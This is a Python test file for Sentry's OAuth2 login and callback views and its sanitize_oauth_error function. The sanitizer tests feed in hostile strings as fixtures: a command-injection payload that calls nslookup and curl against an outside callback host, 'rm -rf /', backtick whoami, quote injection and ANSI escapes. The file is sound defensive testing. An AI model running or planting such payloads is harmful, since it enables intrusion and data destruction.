from collections import namedtuple
from functools import cached_property
from unittest import TestCase
from unittest.mock import MagicMock, patch
from urllib.parse import parse_qs, parse_qsl, urlparse

import responses
from django.test import Client, RequestFactory
from requests.exceptions import SSLError

import sentry.identity
from sentry.identity.oauth2 import OAuth2CallbackView, OAuth2LoginView, sanitize_oauth_error
from sentry.identity.pipeline import IdentityPipeline
from sentry.identity.providers.dummy import DummyProvider
from sentry.integrations.types import EventLifecycleOutcome
from sentry.shared_integrations.exceptions import ApiUnauthorized
from sentry.testutils.asserts import assert_failure_metric, assert_slo_metric
from sentry.testutils.silo import control_silo_test

MockResponse = namedtuple("MockResponse", ["headers", "content"])


@control_silo_test
@patch("sentry.integrations.utils.metrics.EventLifecycle.record_event")
class OAuth2CallbackViewTest(TestCase):
    def setUp(self) -> None:
        sentry.identity.register(DummyProvider)
        super().setUp()
        self.request = RequestFactory().get("/")
        self.request.subdomain = None

    def tearDown(self) -> None:
        super().tearDown()
        sentry.identity.unregister(DummyProvider)

    @cached_property
    def view(self):
        return OAuth2CallbackView(
            access_token_url="https://example.org/oauth/token",
            client_id=123456,
            client_secret="secret-value",
        )

    @responses.activate
    def test_exchange_token_success(self, mock_record: MagicMock) -> None:
        responses.add(
            responses.POST, "https://example.org/oauth/token", json={"token": "a-fake-token"}
        )

        pipeline = IdentityPipeline(request=self.request, provider_key="dummy")
        code = "auth-code"
        result = self.view.exchange_token(self.request, pipeline, code)
        assert "token" in result
        assert "a-fake-token" == result["token"]

        assert len(responses.calls) == 1
        assert responses.calls[0].request.url == "https://example.org/oauth/token"
        data = dict(parse_qsl(responses.calls[0].request.body))
        assert data == {
            "client_id": "123456",
            "client_secret": "secret-value",
            "code": "auth-code",
            "grant_type": "authorization_code",
            "redirect_uri": "http://testserver/extensions/default/setup/",
        }

        assert_slo_metric(mock_record, EventLifecycleOutcome.SUCCESS)

    @responses.activate
    def test_exchange_token_success_customer_domains(self, mock_record: MagicMock) -> None:
        responses.add(
            responses.POST, "https://example.org/oauth/token", json={"token": "a-fake-token"}
        )
        self.request.subdomain = "albertos-apples"
        pipeline = IdentityPipeline(request=self.request, provider_key="dummy")
        code = "auth-code"
        result = self.view.exchange_token(self.request, pipeline, code)
        assert "token" in result
        assert "a-fake-token" == result["token"]

        assert len(responses.calls) == 1
        assert responses.calls[0].request.url == "https://example.org/oauth/token"
        data = dict(parse_qsl(responses.calls[0].request.body))
        assert data == {
            "client_id": "123456",
            "client_secret": "secret-value",
            "code": "auth-code",
            "grant_type": "authorization_code",
            "redirect_uri": "http://testserver/extensions/default/setup/",
        }

        assert_slo_metric(mock_record, EventLifecycleOutcome.SUCCESS)

    @responses.activate
    def test_exchange_token_ssl_error(self, mock_record: MagicMock) -> None:
        def ssl_error(request):
            raise SSLError("Could not build connection")

        responses.add_callback(
            responses.POST, "https://example.org/oauth/token", callback=ssl_error
        )
        pipeline = IdentityPipeline(request=self.request, provider_key="dummy")
        code = "auth-code"
        result = self.view.exchange_token(self.request, pipeline, code)
        assert "token" not in result
        assert "error" in result
        assert "error_description" in result
        assert "SSL" in result["error_description"]

        assert_failure_metric(mock_record, "ssl_error")

    @responses.activate
    def test_connection_error(self, mock_record: MagicMock) -> None:
        def connection_error(request):
            raise ConnectionError("Name or service not known")

        responses.add_callback(
            responses.POST, "https://example.org/oauth/token", callback=connection_error
        )
        pipeline = IdentityPipeline(request=self.request, provider_key="dummy")
        code = "auth-code"
        result = self.view.exchange_token(self.request, pipeline, code)
        assert "token" not in result
        assert "error" in result
        assert "connect" in result["error"]
        assert "error_description" in result

        assert_failure_metric(mock_record, "connection_error")

    @responses.activate
    def test_exchange_token_no_json(self, mock_record: MagicMock) -> None:
        responses.add(responses.POST, "https://example.org/oauth/token", body="")
        pipeline = IdentityPipeline(request=self.request, provider_key="dummy")
        code = "auth-code"
        result = self.view.exchange_token(self.request, pipeline, code)
        assert "token" not in result
        assert "error" in result
        assert "error_description" in result
        assert "JSON" in result["error_description"]

        assert_failure_metric(mock_record, "json_error")

    @responses.activate
    def test_api_error(self, mock_record: MagicMock) -> None:
        responses.add(
            responses.POST,
            "https://example.org/oauth/token",
            json={"token": "a-fake-token"},
            status=401,
        )
        pipeline = IdentityPipeline(request=self.request, provider_key="dummy")
        code = "auth-code"
        result = self.view.exchange_token(self.request, pipeline, code)
        assert "token" not in result
        assert "error" in result
        assert "401" in result["error"]

        assert_failure_metric(mock_record, ApiUnauthorized('{"token": "a-fake-token"}'))


@control_silo_test
class OAuth2LoginViewTest(TestCase):
    def setUp(self) -> None:
        sentry.identity.register(DummyProvider)
        super().setUp()
        self.request = RequestFactory().get("/")
        self.request.session = Client().session
        self.request.subdomain = None

    def tearDown(self) -> None:
        super().tearDown()
        sentry.identity.unregister(DummyProvider)

    @cached_property
    def view(self):
        return OAuth2LoginView(
            authorize_url="https://example.org/oauth2/authorize",
            client_id=123456,
            scope="all-the-things",
        )

    def test_simple(self) -> None:
        pipeline = IdentityPipeline(request=self.request, provider_key="dummy")
        response = self.view.dispatch(self.request, pipeline)

        assert response.status_code == 302
        assert response["Location"].startswith("https://example.org/oauth2/authorize")
        redirect_url = urlparse(response["Location"])
        query = parse_qs(redirect_url.query)

        assert query["client_id"][0] == "123456"
        assert query["redirect_uri"][0] == "http://testserver/extensions/default/setup/"
        assert query["response_type"][0] == "code"
        assert query["scope"][0] == "all-the-things"
        assert "state" in query

    def test_customer_domains(self) -> None:
        self.request.subdomain = "albertos-apples"
        pipeline = IdentityPipeline(request=self.request, provider_key="dummy")
        response = self.view.dispatch(self.request, pipeline)

        assert response.status_code == 302
        assert response["Location"].startswith("https://example.org/oauth2/authorize")
        redirect_url = urlparse(response["Location"])
        query = parse_qs(redirect_url.query)

        assert query["client_id"][0] == "123456"
        assert query["redirect_uri"][0] == "http://testserver/extensions/default/setup/"
        assert query["response_type"][0] == "code"
        assert query["scope"][0] == "all-the-things"
        assert "state" in query


class TestSanitizeOAuthError(TestCase):
    """Test suite for sanitize_oauth_error function."""

    def test_sanitize_command_injection_payload(self) -> None:
        """Test that command injection payloads are sanitized."""
        malicious_input = "$(nslookup -q=cname hitocikwxxpaw71102.bxss.me||curl hitocikwxxpaw71102.bxss.me)"
        sanitized = sanitize_oauth_error(malicious_input)
        
        # Should not contain dangerous characters
        assert "$" not in sanitized
        assert "(" not in sanitized
        assert ")" not in sanitized
        assert "|" not in sanitized
        assert "nslookup" in sanitized  # Safe text should remain
        assert "curl" in sanitized  # Safe text should remain
        
    def test_sanitize_removes_control_characters(self) -> None:
        """Test that control characters like newlines and ANSI escapes are removed."""
        malicious_input = "error\n\r\x1b[31mred text\x1b[0m"
        sanitized = sanitize_oauth_error(malicious_input)
        
        # Should not contain newlines or ANSI escape sequences
        assert "\n" not in sanitized
        assert "\r" not in sanitized
        assert "\x1b" not in sanitized
        assert "error" in sanitized
        assert "red text" in sanitized

    def test_sanitize_removes_shell_metacharacters(self) -> None:
        """Test that shell metacharacters are removed."""
        test_cases = [
            ("error & rm -rf /", "error  rm -rf "),
            ("error; ls -la", "error ls -la"),
            ("error > /dev/null", "error  devnull"),
            ("error | grep secret", "error  grep secret"),
            ("error `whoami`", "error whoami"),
            ("error $PATH", "error PATH"),
        ]
        
        for malicious, expected_contains in test_cases:
            sanitized = sanitize_oauth_error(malicious)
            # Verify dangerous characters are removed
            assert "&" not in sanitized
            assert ";" not in sanitized
            assert ">" not in sanitized
            assert "<" not in sanitized
            assert "|" not in sanitized
            assert "`" not in sanitized
            assert "$" not in sanitized

    def test_sanitize_removes_quotes(self) -> None:
        """Test that quotes are removed to prevent string escaping."""
        malicious_input = 'error\' OR "1"="1'
        sanitized = sanitize_oauth_error(malicious_input)
        
        assert "'" not in sanitized
        assert '"' not in sanitized
        assert "error OR 11" in sanitized

    def test_sanitize_limits_length(self) -> None:
        """Test that excessively long errors are truncated."""
        long_input = "A" * 300
        sanitized = sanitize_oauth_error(long_input)
        
        assert len(sanitized) <= 203  # 200 chars + "..."
        assert sanitized.endswith("...")

    def test_sanitize_empty_string(self) -> None:
        """Test that empty strings are handled."""
        sanitized = sanitize_oauth_error("")
        assert sanitized == ""

    def test_sanitize_all_dangerous_chars_returns_placeholder(self) -> None:
        """Test that if all chars are dangerous, return placeholder."""
        malicious_input = "$$$|||&&&"
        sanitized = sanitize_oauth_error(malicious_input)
        
        assert sanitized == "[Invalid error parameter]"

    def test_sanitize_preserves_safe_text(self) -> None:
        """Test that legitimate error messages are preserved."""
        safe_input = "access_denied The user cancelled the request"
        sanitized = sanitize_oauth_error(safe_input)
        
        assert sanitized == safe_input


@control_silo_test
@patch("sentry.integrations.utils.metrics.EventLifecycle.record_event")
class OAuth2CallbackViewMaliciousErrorTest(TestCase):
    """Test suite for OAuth2CallbackView handling of malicious error parameters."""

    def setUp(self) -> None:
        sentry.identity.register(DummyProvider)
        super().setUp()
        self.request_factory = RequestFactory()
        
    def tearDown(self) -> None:
        super().tearDown()
        sentry.identity.unregister(DummyProvider)

    @cached_property
    def view(self):
        return OAuth2CallbackView(
            access_token_url="https://example.org/oauth/token",
            client_id=123456,
            client_secret="secret-value",
        )

    def test_malicious_error_parameter_is_sanitized(self, mock_record: MagicMock) -> None:
        """Test that malicious error parameters are sanitized before logging and display."""
        malicious_error = "$(nslookup -q=cname hitocikwxxpaw71102.bxss.me||curl hitocikwxxpaw71102.bxss.me)"
        
        request = self.request_factory.get(
            "/identity/login/github/",
            {"error": malicious_error}
        )
        request.subdomain = None
        request.session = Client().session
        
        pipeline = IdentityPipeline(request=request, provider_key="dummy")
        pipeline.initialize()
        
        response = self.view.dispatch(request, pipeline)
        
        # Response should be 200 (error page)
        assert response.status_code == 200
        
        # Response content should not contain the malicious payload
        response_text = response.content.decode("utf-8")
        assert "$" not in response_text
        assert "nslookup" in response_text  # Safe part should remain
        assert "||" not in response_text
        assert "curl" in response_text  # Safe part should remain
        
    def test_error_with_control_characters_is_sanitized(self, mock_record: MagicMock) -> None:
        """Test that error parameters with control characters are sanitized."""
        malicious_error = "error\n\r\x1b[31minjected\x1b[0m"
        
        request = self.request_factory.get(
            "/identity/login/github/",
            {"error": malicious_error}
        )
        request.subdomain = None
        request.session = Client().session
        
        pipeline = IdentityPipeline(request=request, provider_key="dummy")
        pipeline.initialize()
        
        response = self.view.dispatch(request, pipeline)
        
        # Response should be 200 (error page)
        assert response.status_code == 200
        
        # Response should not contain control characters
        response_text = response.content.decode("utf-8")
        assert "\x1b" not in response_text
        # Should still contain the safe text
        assert "error" in response_text
        assert "injected" in response_text
